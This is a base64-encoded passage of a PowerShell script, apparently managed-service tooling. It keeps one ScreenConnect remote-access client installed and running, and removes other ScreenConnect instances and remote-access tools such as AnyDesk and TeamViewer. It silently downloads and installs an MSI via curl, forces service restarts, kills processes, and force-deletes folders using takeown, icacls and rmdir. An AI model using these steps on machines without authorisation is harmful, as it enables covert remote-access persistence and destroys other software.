IFNpbGVudGx5Q29udGludWUKICAgIH0gZWxzZWlmIChGaW5kLVByb2R1Y3RHdWlkICRmcFRyeSkg
ewogICAgICAgIEdMb2cgJ2xpZ2h0X3JlcGFpcl9hdHRlbXB0JwogICAgICAgICRudWxsID0gUmVw
YWlyLVNDU2VydmljZSAkZnBUcnkKICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA0CiAgICAg
ICAgaWYgKFRlc3QtU2NSdW5uaW5nICRmcFRyeSkgewogICAgICAgICAgICBTZXQtR3J5eGFGcCAk
ZnBUcnkKICAgICAgICAgICAgR0xvZyAnbGlnaHRfcmVwYWlyZWRfb2snCiAgICAgICAgICAgIHJl
dHVybiAiSEVBTFRIWXwkZnBUcnl8cmVwYWlyZWQ9MSIKICAgICAgICB9CiAgICB9CiAgICAkcnVu
bmluZ0ZwID0gRmluZC1SdW5uaW5nR3J5eGFGcAogICAgaWYgKCRydW5uaW5nRnApIHsKICAgICAg
ICBTZXQtR3J5eGFGcCAkcnVubmluZ0ZwCiAgICAgICAgR0xvZyAibGlnaHRfZm91bmRfb3RoZXJf
cnVubmluZz0kcnVubmluZ0ZwIgogICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmluZ0ZwfHJ1
bm5pbmc9MXxkaXNjb3ZlcmVkIgogICAgfQoKICAgIGlmICgtbm90ICRGb3JjZSAtYW5kIChUZXN0
LUFueU5vblNldnJ6U2NSdW5uaW5nKSkgewogICAgICAgICRydW5uaW5nRnAgPSBGaW5kLVJ1bm5p
bmdHcnl4YUZwCiAgICAgICAgU2V0LUdyeXhhRnAgJHJ1bm5pbmdGcAogICAgICAgIHJldHVybiAi
SEVBTFRIWXwkcnVubmluZ0ZwfHJ1bm5pbmc9MXxndWFyZCIKICAgIH0KCiAgICAjIG1zaWV4ZWMg
cGF0aCBvbmx5IGZyb20gaGVyZSDigJQgcmF0ZS1saW1pdCBhcHBsaWVzICh1bmxlc3MgLUZvcmNl
IC8gZnVsbHkgYWJzZW50KQogICAgaWYgKC1ub3QgJEZvcmNlIC1hbmQgLW5vdCAoVGVzdC1Hcnl4
YVJlaW5zdGFsbEFsbG93ZWQpKSB7CiAgICAgICAgR0xvZyAncmVpbnN0YWxsX3JhdGVfbGltaXRl
ZCcKICAgICAgICByZXR1cm4gIlVOSEVBTFRIWXwkb2xkRnB8cmF0ZS1saW1pdGVkIgogICAgfQoK
ICAgICRtc2kgPSBKb2luLVBhdGggJFdvcmtEaXIgJ3BrZ19ncnl4YS5tc2knCiAgICAkdG1wID0g
Sm9pbi1QYXRoICRlbnY6VEVNUCAoInNjX2dyeXhhX3swfS5tc2kiIC1mIFtndWlkXTo6TmV3R3Vp
ZCgpLlRvU3RyaW5nKCdOJykpCiAgICAkZmV0Y2hlZCA9ICRmYWxzZQogICAgdHJ5IHsKICAgICAg
ICAkY3VybCA9IEpvaW4tUGF0aCAkZW52OlN5c3RlbVJvb3QgJ1N5c3RlbTMyXGN1cmwuZXhlJwog
ICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJGN1cmwpKSB7ICRjdXJsID0gJ2N1cmwuZXhlJyB9
CiAgICAgICAgJiAkY3VybCAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgMjUg
LS1tYXgtdGltZSAzMDAgLW8gJHRtcCAkc2NyaXB0OkdyeXhhTXNpVXJsIDI+JjEgfCBPdXQtTnVs
bAogICAgICAgIGlmICgoVGVzdC1QYXRoICR0bXApIC1hbmQgKChHZXQtSXRlbSAkdG1wKS5MZW5n
dGggLWd0IDEwMDAwMDApKSB7CiAgICAgICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJHRt
cCAtRGVzdGluYXRpb24gJG1zaSAtRm9yY2UKICAgICAgICAgICAgJGZldGNoZWQgPSAkdHJ1ZQog
ICAgICAgICAgICBHTG9nICgibXNpX2ZldGNoZWQgYnl0ZXM9ezB9IiAtZiAoR2V0LUl0ZW0gJG1z
aSkuTGVuZ3RoKQogICAgICAgIH0KICAgIH0gY2F0Y2ggeyBHTG9nICJtc2lfZmV0Y2hfZXJyPSRf
IiB9CiAgICBmaW5hbGx5IHsgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAgLUZvcmNlIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0KCiAgICBpZiAoLW5vdCAkZmV0Y2hlZCAtYW5k
IChUZXN0LVBhdGggJG1zaSkgLWFuZCAoKEdldC1JdGVtICRtc2kpLkxlbmd0aCAtZ3QgMTAwMDAw
MCkpIHsKICAgICAgICAkZmV0Y2hlZCA9ICR0cnVlCiAgICAgICAgR0xvZyAnbXNpX3VzaW5nX2Nh
Y2hlJwogICAgfQogICAgaWYgKC1ub3QgJGZldGNoZWQpIHsKICAgICAgICBHTG9nICdtc2lfZmV0
Y2hfRkFJTCcKICAgICAgICByZXR1cm4gIlVOSEVBTFRIWXwkb2xkRnB8bXNpLWZldGNoLWZhaWwi
CiAgICB9CgogICAgJHByb2ROYW1lID0gR2V0LU1zaVByb3BlcnR5ICRtc2kgJ1Byb2R1Y3ROYW1l
JwogICAgJG5ld0ZwID0gR2V0LUZwRnJvbVByb2R1Y3ROYW1lICRwcm9kTmFtZQogICAgaWYgKC1u
b3QgJG5ld0ZwKSB7CiAgICAgICAgR0xvZyAibXNpX2ZwX3BhcnNlX0ZBSUwgbmFtZT0kcHJvZE5h
bWUiCiAgICAgICAgcmV0dXJuICJVTkhFQUxUSFl8JG9sZEZwfG1zaS1mcC1wYXJzZS1mYWlsIgog
ICAgfQogICAgR0xvZyAibXNpX2ZwPSRuZXdGcCBwcm9kdWN0PSRwcm9kTmFtZSIKCiAgICBpZiAo
LW5vdCAkRm9yY2UgLWFuZCAoVGVzdC1BbnlOb25TZXZyelNjUnVubmluZykpIHsKICAgICAgICAk
cnVubmluZ0ZwID0gRmluZC1SdW5uaW5nR3J5eGFGcAogICAgICAgIFNldC1Hcnl4YUZwICRydW5u
aW5nRnAKICAgICAgICBHTG9nICdhYm9ydF9pbnN0YWxsX2JlY2FtZV9ydW5uaW5nJwogICAgICAg
IHJldHVybiAiSEVBTFRIWXwkcnVubmluZ0ZwfHJ1bm5pbmc9MXxhYm9ydC1pbnN0YWxsIgogICAg
fQoKICAgIE1hcmstR3J5eGFSZWluc3RhbGwKICAgIGlmIChGaW5kLVByb2R1Y3RHdWlkICRuZXdG
cCkgewogICAgICAgIEdMb2cgInJlcGFpcl9iZWZvcmVfaW5zdGFsbD0kbmV3RnAiCiAgICAgICAg
JG51bGwgPSBSZXBhaXItU0NTZXJ2aWNlICRuZXdGcAogICAgICAgIGlmIChUZXN0LVNjUnVubmlu
ZyAkbmV3RnApIHsKICAgICAgICAgICAgU2V0LUdyeXhhRnAgJG5ld0ZwCiAgICAgICAgICAgIHJl
dHVybiAiSEVBTFRIWXwkbmV3RnB8cmVwYWlyZWQ9MSIKICAgICAgICB9CiAgICAgICAgR0xvZyAi
dW5pbnN0YWxsX3N0dWNrPSRuZXdGcCIKICAgICAgICAkbnVsbCA9IFVuaW5zdGFsbC1TY0Zpbmdl
cnByaW50ICRuZXdGcAogICAgfQogICAgaWYgKCRvbGRGcCAtYW5kICRvbGRGcCAtbmUgJG5ld0Zw
IC1hbmQgKEZpbmQtUHJvZHVjdEd1aWQgJG9sZEZwKSkgewogICAgICAgIEdMb2cgInVuaW5zdGFs
bF9vbGRfY2ZnPSRvbGRGcCIKICAgICAgICAkbnVsbCA9IFVuaW5zdGFsbC1TY0ZpbmdlcnByaW50
ICRvbGRGcAogICAgfQoKICAgIFNldC1Hcnl4YUZwICRuZXdGcAogICAgJGV4aXQgPSBJbnN0YWxs
LUdyeXhhRnJvbU1zaSAkbXNpCiAgICBHTG9nICJtc2lleGVjX2V4aXQ9JGV4aXQiCgogICAgJG5h
bWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRuZXdGcCkiCiAgICAmIHNjLmV4ZSBjb25maWcg
JG5hbWUgc3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxsCiAgICAmIHNjLmV4ZSBmYWlsdXJlICRu
YW1lIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwL3Jlc3Rh
cnQvMzAwMCAyPiYxIHwgT3V0LU51bGwKICAgICYgc2MuZXhlIHN0YXJ0ICRuYW1lIDI+JjEgfCBP
dXQtTnVsbAogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNQogICAgJiBzYy5leGUgc3RhcnQgJG5h
bWUgMj4mMSB8IE91dC1OdWxsCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1CgogICAgZm9yZWFj
aCAoJGtmcCBpbiAkc2NyaXB0OlNldnJ6S2VlcCkgewogICAgICAgICRrbiA9ICJTY3JlZW5Db25u
ZWN0IENsaWVudCAoJGtmcCkiCiAgICAgICAgJiBzYy5leGUgc3RhcnQgJGtuIDI+JjEgfCBPdXQt
TnVsbAogICAgICAgIGlmICgtbm90IChHZXQtU2VydmljZSAtTmFtZSAka24gLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUpKSB7ICRudWxsID0gUmVwYWlyLVNDU2VydmljZSAka2ZwIH0KICAg
IH0KCiAgICBpZiAoLW5vdCAoVGVzdC1TY1J1bm5pbmcgJG5ld0ZwKSkgeyAkbnVsbCA9IFJlcGFp
ci1TQ1NlcnZpY2UgJG5ld0ZwIH0KCiAgICBpZiAoVGVzdC1TY1J1bm5pbmcgJG5ld0ZwKSB7CiAg
ICAgICAgR0xvZyAncG9zdF9ydW5uaW5nX29rJwogICAgICAgIHJldHVybiAiSEVBTFRIWXwkbmV3
RnB8aW5zdGFsbGVkPTEiCiAgICB9CiAgICBHTG9nICdwb3N0X3N0aWxsX2Rvd24nCiAgICByZXR1
cm4gIlVOSEVBTFRIWXwkbmV3RnB8c3RpbGwtbm90LXJ1bm5pbmciCn0KCmZ1bmN0aW9uIEludm9r
ZS1FeHRlcm1pbmF0ZSB7CiAgICAjIEw3OiB0cnVlIHJlbW92YWwuIENvcnJlY3QgV09XNjQzMk5v
ZGUgaGl2ZSArIG1zaWV4ZWMgKyBVbmluc3RhbGxTdHJpbmcKICAgICMgZmFsbGJhY2sgKyBmb3Jj
ZSBkaXIgbnVrZS4gS2VlcCBzZXZyeithbHQrY3VycmVudCBncnl4YSBGUCAoZ3J5eGEuY2ZnKS4K
ICAgICMgTzQxOiBzeW5jIFJ1bm5pbmcgR3J5eGEgRlAgaW50byBjZmcgQkVGT1JFIGFueSBraWxs
OyBuZXZlciBraWxsIFNDIHByb2NzCiAgICAjIHdpdGhvdXQgYSBmb3JlaWduIEZQIGluIHBhdGgv
Y21kbGluZSAobnVsbCBwYXRoIHdhcyBraWxsaW5nIEdyeXhhIGV2ZXJ5IHRpY2spLgogICAgJGxv
ZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnZXh0ZXJtaW5hdGUubG9nJwogICAgJHJ1bm5pbmdHID0g
RmluZC1SdW5uaW5nR3J5eGFGcAogICAgaWYgKCRydW5uaW5nRykgeyBTZXQtR3J5eGFGcCAkcnVu
bmluZ0cgfQogICAgJGtlZXAgPSBAKEdldC1LZWVwRmluZ2VycHJpbnRzKQogICAgJG4gPSBAeyBz
dmMgPSAwOyBwcm9jID0gMDsgZGlyID0gMDsgcHJvZHVjdCA9IDA7IHJtbSA9IDA7IGZhaWwgPSAw
IH0KICAgIGZ1bmN0aW9uIExvZyhbc3RyaW5nXSRtKSB7CiAgICAgICAgJGxpbmUgPSAnezB9IHsx
fScgLWYgKEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSwgJG0KICAgICAg
ICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgJGxpbmUgLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUKICAgICAgICAjIE80MTogZG8gTk9UIFdyaXRlLU91dHB1dCBMb2cg
bGluZXMgKHBvbGx1dGVzIGZvciAvZiBjYWxsZXJzKQogICAgfQogICAgIyBQcm90ZWN0IEdyeXhh
IGR1cmluZyBzdGFydCByYWNlOiBhbnkgbGl2ZSBTQyBwcm9jZXNzIHdob3NlIHBhdGggZW1iZWRz
IGEKICAgICMgbm9uLXNldnJ6IEZQIGlzIGEga2VlcGVyIGV2ZW4gaWYgdGhlIHNlcnZpY2UgaXMg
bm90IFJ1bm5pbmcgeWV0LgogICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUZpbHRl
ciAiTmFtZSBsaWtlICdTY3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICRibG9iID0gIiQoW3N0cmluZ10kXy5FeGVj
dXRhYmxlUGF0aCkgJChbc3RyaW5nXSRfLkNvbW1hbmRMaW5lKSIKICAgICAgICBpZiAoJGJsb2Ig
LW1hdGNoICdTY3JlZW5Db25uZWN0IENsaWVudCBcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7CiAg
ICAgICAgICAgICRmcCA9ICRNYXRjaGVzWzFdLlRvTG93ZXIoKQogICAgICAgICAgICBpZiAoJGZw
IC1ub3RpbiAkc2NyaXB0OlNldnJ6S2VlcCAtYW5kICRmcCAtbm90aW4gJGtlZXApIHsKICAgICAg
ICAgICAgICAgICRrZWVwICs9ICRmcAogICAgICAgICAgICAgICAgU2V0LUdyeXhhRnAgJGZwCiAg
ICAgICAgICAgICAgICBMb2cgImtlZXBfYWRkX2Zyb21fcHJvYyBmcD0kZnAiCiAgICAgICAgICAg
IH0KICAgICAgICB9CiAgICB9CiAgICBmdW5jdGlvbiBJcy1LZWVwZXIoW3N0cmluZ10kcykgewog
ICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2UgfQogICAgICAgIGZvcmVhY2ggKCRr
IGluICRrZWVwKSB7IGlmICgkcyAtbGlrZSAiKiRrKiIpIHsgcmV0dXJuICR0cnVlIH0gfQogICAg
ICAgIHJldHVybiAkZmFsc2UKICAgIH0KICAgIGZ1bmN0aW9uIEZvcmNlLVJlbW92ZURpcihbc3Ry
aW5nXSRkKSB7CiAgICAgICAgaWYgKC1ub3QgJGQgLW9yIC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJh
bFBhdGggJGQpKSB7IHJldHVybiAkdHJ1ZSB9CiAgICAgICAgR2V0LUNpbUluc3RhbmNlIFdpbjMy
X1Byb2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVy
ZS1PYmplY3QgeyAkXy5FeGVjdXRhYmxlUGF0aCAtYW5kICRfLkV4ZWN1dGFibGVQYXRoLlN0YXJ0
c1dpdGgoJGQsIFtTdHJpbmdDb21wYXJpc29uXTo6T3JkaW5hbElnbm9yZUNhc2UpIH0gfAogICAg
ICAgICAgICBGb3JFYWNoLU9iamVjdCB7IFN0b3AtUHJvY2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1G
b3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9CiAgICAgICAgJiB0YWtlb3duLmV4
ZSAvRiAkZCAvUiAvRCBZIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAv
Z3JhbnQgJypTLTEtNS0zMi01NDQ6RicgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsCiAgICAgICAg
JiBpY2FjbHMuZXhlICRkIC9ncmFudCAnQWRtaW5pc3RyYXRvcnM6RicgL1QgL0MgL1EgMj4mMSB8
IE91dC1OdWxsCiAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1cnNlIC1G
b3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIGlmIChUZXN0LVBhdGgg
LUxpdGVyYWxQYXRoICRkKSB7CiAgICAgICAgICAgIGNtZC5leGUgL2MgImF0dHJpYiAtaCAtcyAt
ciAvcyAvZCBgIiRkXCouKmAiIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgY21kLmV4ZSAv
YyAicm1kaXIgL3MgL3EgYCIkZGAiIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICB9CiAgICAgICAg
aWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpIHsKICAgICAgICAgICAgJGVtcHR5ID0gSm9p
bi1QYXRoICRlbnY6VEVNUCAoIm93bl9lbXB0eV8iICsgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJp
bmcoJ04nKSkKICAgICAgICAgICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAk
ZW1wdHkgLUZvcmNlIHwgT3V0LU51bGwKICAgICAgICAgICAgJiByb2JvY29weS5leGUgJGVtcHR5
ICRkIC9NSVIgL1I6MCAvVzowIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICBSZW1vdmUtSXRl
bSAtTGl0ZXJhbFBhdGggJGVtcHR5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNl
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgfQogICAgICAgIHJldHVybiAt
bm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKQogICAgfQogICAgZnVuY3Rpb24gVW5pbnN0
YWxsLVByb2R1Y3RLZXkoJGtleSkgewogICAgICAgICRndWlkID0gJGtleS5QU0NoaWxkTmFtZQog
ICAgICAgICRwcm9wID0gR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZQogICAgICAgICRkbiA9ICRwcm9wLkRpc3BsYXlOYW1lCiAgICAgICAg
aWYgKCRndWlkIC1saWtlICd7Kn0nKSB7CiAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBt
c2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9
UmVhbGx5U3VwcHJlc3MiIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAg
ICAgICAgIExvZyAicHJvZHVjdF9tc2lleGVjIFskZG5dIGd1aWQ9JGd1aWQgZXhpdD0kKCRwLkV4
aXRDb2RlKSIKICAgICAgICAgICAgaWYgKCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0LCAz
MDEwKSB7IHJldHVybiAkdHJ1ZSB9CiAgICAgICAgfQogICAgICAgICR1cyA9ICRwcm9wLlVuaW5z
dGFsbFN0cmluZwogICAgICAgIGlmICgkdXMpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAg
ICAgICAgIGlmICgkdXMgLW1hdGNoICcoP2kpbXNpZXhlYycpIHsKICAgICAgICAgICAgICAgICAg
ICAkYXJncyA9ICgkdXMgLXJlcGxhY2UgJyg/aSleLiptc2lleGVjKFwuZXhlKT9ccyonLCAnJykK
ICAgICAgICAgICAgICAgICAgICBpZiAoJGFyZ3MgLW5vdG1hdGNoICcvcW4nKSB7ICRhcmdzID0g
IiRhcmdzIC9xbiAvbm9yZXN0YXJ0IiB9CiAgICAgICAgICAgICAgICAgICAgJHAgPSBTdGFydC1Q
cm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgJGFyZ3MgLVdhaXQgLVBhc3NUaHJ1IC1X
aW5kb3dTdHlsZSBIaWRkZW4KICAgICAgICAgICAgICAgICAgICBMb2cgInByb2R1Y3RfdW5pbnN0
YWxsc3RyaW5nX21zaSBbJGRuXSBleGl0PSQoJHAuRXhpdENvZGUpIgogICAgICAgICAgICAgICAg
ICAgIHJldHVybiAoJHAuRXhpdENvZGUgLWluIDAsIDE2MDUsIDE2MTQsIDMwMTApCiAgICAgICAg
ICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBj
bWQuZXhlIC1Bcmd1bWVudExpc3QgIi9jICR1cyAvUyAvc2lsZW50IC9xdWlldCAvcW4iIC1XYWl0
IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgICAgICAgICAgTG9nICJw
cm9kdWN0X3VuaW5zdGFsbHN0cmluZ19leGUgWyRkbl0gZXhpdD0kKCRwLkV4aXRDb2RlKSIKICAg
ICAgICAgICAgICAgICAgICByZXR1cm4gKCRwLkV4aXRDb2RlIC1lcSAwKQogICAgICAgICAgICAg
ICAgfQogICAgICAgICAgICB9IGNhdGNoIHsgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19G
QUlMIFskZG5dICRfIiB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0KCiAg
ICBMb2cgJ2V4dGVybWluYXRlX2VuZ2luZV9MN19iZWdpbicKCiAgICAjIDEuIGZvcmVpZ24gU0Mg
cHJvZHVjdHMgZnJvbSBCT1RIIGNvcnJlY3QgQVJQIGhpdmVzCiAgICAkc2VlbiA9IEB7fQogICAg
Zm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgewogICAgICAgIGlmICgt
bm90IChUZXN0LVBhdGggJHJvb3QpKSB7IExvZyAiaGl2ZV9taXNzaW5nICRyb290IjsgY29udGlu
dWUgfQogICAgICAgIExvZyAiaGl2ZV9zY2FuICRyb290IgogICAgICAgIEdldC1DaGlsZEl0ZW0g
JHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAg
ICAgICAgICAgICRwcm9wID0gR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgJGRuID0gJHByb3AuRGlzcGxheU5hbWUKICAg
ICAgICAgICAgaWYgKC1ub3QgJGRuKSB7IHJldHVybiB9CiAgICAgICAgICAgIGlmICgkZG4gLW5v
dG1hdGNoICcoP2kpU2NyZWVuQ29ubmVjdFxzK0NsaWVudFxzKlwoKFswLTlBLUZhLWZdezE2fSlc
KScpIHsgcmV0dXJuIH0KICAgICAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpCiAg
ICAgICAgICAgIGlmICgkZnAgLWluICRrZWVwKSB7IHJldHVybiB9CiAgICAgICAgICAgIGlmICgk
c2Vlbi5Db250YWluc0tleSgkXy5QU0NoaWxkTmFtZSkpIHsgcmV0dXJuIH0KICAgICAgICAgICAg
JHNlZW5bJF8uUFNDaGlsZE5hbWVdID0gJHRydWUKICAgICAgICAgICAgaWYgKFVuaW5zdGFsbC1Q
cm9kdWN0S2V5ICRfKSB7ICRuLnByb2R1Y3QrKyB9IGVsc2UgeyAkbi5mYWlsKys7IExvZyAicHJv
ZHVjdF9SRU1PVkVfRkFJTEVEIFskZG5dIiB9CiAgICAgICAgfQogICAgfQoKICAgICMgMi4gZm9y
ZWlnbiBTQyBzZXJ2aWNlcwogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdT
Y3JlZW5Db25uZWN0IENsaWVudConIH0pKSB7CiAgICAgICAgaWYgKElzLUtlZXBlciAkc3ZjLk5h
bWUpIHsgY29udGludWUgfQogICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJHN2Yy5OYW1lKSIgMj4m
MSB8IE91dC1OdWxsCiAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA2MDAKICAgICAg
ICAmIHNjLmV4ZSBkZWxldGUgIiQoJHN2Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAg
JG4uc3ZjKys7IExvZyAic3ZjX2RlbGV0ZWQgJCgkc3ZjLk5hbWUpIgogICAgfQoKICAgICMgMy4g
Zm9yZWlnbiBTQyBwcm9jZXNzZXMg4oCUIE9OTFkgaWYgcGF0aC9jbWRsaW5lIGVtYmVkcyBhIE5P
Ti1rZWVwZXIgRlAuCiAgICAjIE80MTogbnVsbCBFeGVjdXRhYmxlUGF0aCB1c2VkIHRvIGtpbGwg
R3J5eGEgQ2xpZW50U2VydmljZSBldmVyeSB0aWNrIOKGkiByZWluc3RhbGwgbG9vcC4KICAgIEdl
dC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1GaWx0ZXIgIk5hbWUgbGlrZSAnU2NyZWVuQ29u
bmVjdCUnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsK
ICAgICAgICAkZXhlID0gW3N0cmluZ10kXy5FeGVjdXRhYmxlUGF0aAogICAgICAgICRjbWQgPSBb
c3RyaW5nXSRfLkNvbW1hbmRMaW5lCiAgICAgICAgJGJsb2IgPSAiJGV4ZSAkY21kIgogICAgICAg
IGlmIChJcy1LZWVwZXIgJGJsb2IpIHsgcmV0dXJuIH0KICAgICAgICBpZiAoJGJsb2IgLW5vdG1h
dGNoICdcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7CiAgICAgICAgICAgIExvZyAicHJvY19za2lw
X25vX2ZwIHBpZD0kKCRfLlByb2Nlc3NJZCkgbmFtZT0kKCRfLk5hbWUpIgogICAgICAgICAgICBy
ZXR1cm4KICAgICAgICB9CiAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpCiAgICAg
ICAgaWYgKCRmcCAtaW4gJGtlZXApIHsgcmV0dXJuIH0KICAgICAgICBTdG9wLVByb2Nlc3MgLUlk
ICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAg
ICAkbi5wcm9jKys7IExvZyAicHJvY19raWxsZWQgcGlkPSQoJF8uUHJvY2Vzc0lkKSBmcD0kZnAg
ZXhlPSRleGUiCiAgICB9CgogICAgIyA0LiBmb3JlaWduIFNDIGluc3RhbGwgZGlycyAoUEYgKyBQ
Rjg2KQogICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgkZW52OlByb2dyYW1GaWxlcywgJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9KSkgewogICAgICAgIGlmICgtbm90ICRiYXNlIC1vciAtbm90IChUZXN0
LVBhdGggJGJhc2UpKSB7IGNvbnRpbnVlIH0KICAgICAgICBHZXQtQ2hpbGRJdGVtIC1MaXRlcmFs
UGF0aCAkYmFzZSAtRGlyZWN0b3J5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5l
Y3QqJyB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJGQgPSAkXy5GdWxsTmFt
ZQogICAgICAgICAgICAgICAgaWYgKElzLUtlZXBlciAkZCkgeyByZXR1cm4gfQogICAgICAgICAg
ICAgICAgaWYgKEZvcmNlLVJlbW92ZURpciAkZCkgeyAkbi5kaXIrKzsgTG9nICJkaXJfcmVtb3Zl
ZCAkZCIgfQogICAgICAgICAgICAgICAgZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJkaXJfUkVNT1ZF
X0ZBSUxFRCAkZCIgfQogICAgICAgICAgICB9CiAgICB9CgogICAgIyA1LiBkaXNhbGxvd2VkIFJN
TSAvIHJlbW90ZS1hY2Nlc3MgdG9vbHMgKG1hcmtldCBjb3ZlcmFnZSAyMDI2KS4KICAgICMgS0VF
UCBmb3JldmVyOiBEYXR0by9DZW50cmFTdGFnZSArIFNjcmVlbkNvbm5lY3Qga2VlcCBGUHMgKGhh
bmRsZWQgYWJvdmUpLgogICAgIyBORVZFUiBwdXQgRGF0dG8vQ2VudHJhU3RhZ2UvQ2FnU2Vydmlj
ZSBpbiB0aGlzIGxpc3QuCiAgICBmdW5jdGlvbiBJcy1EYXR0b0tlZXBlcihbc3RyaW5nXSRzKSB7
CiAgICAgICAgaWYgKC1ub3QgJHMpIHsgcmV0dXJuICRmYWxzZSB9CiAgICAgICAgcmV0dXJuIFti
b29sXSgkcyAtbWF0Y2ggJyg/aSlEYXR0b3xDZW50cmFTdGFnZXxDYWdTZXJ2aWNlfEF1dG90YXNr
RW5kcG9pbnQnKQogICAgfQogICAgJHJtbSA9IEAoCiAgICAgICAgQHsgVGFnPSdBbnlEZXNrJzsg
ICAgICBTdmM9QCgnQW55RGVzaycpOyBQcm9jPUAoJ0FueURlc2snKTsgRGlycz1AKCIkZW52OlBy
b2dyYW1GaWxlc1xBbnlEZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFueURlc2siLCIk
ZW52OlByb2dyYW1EYXRhXEFueURlc2siKTsgUHJvZD1AKCdBbnlEZXNrKicpIH0KICAgICAgICBA
eyBUYWc9J1RlYW1WaWV3ZXInOyAgIFN2Yz1AKCdUZWFtVmlld2VyKicpOyBQcm9jPUAoJ1RlYW1W
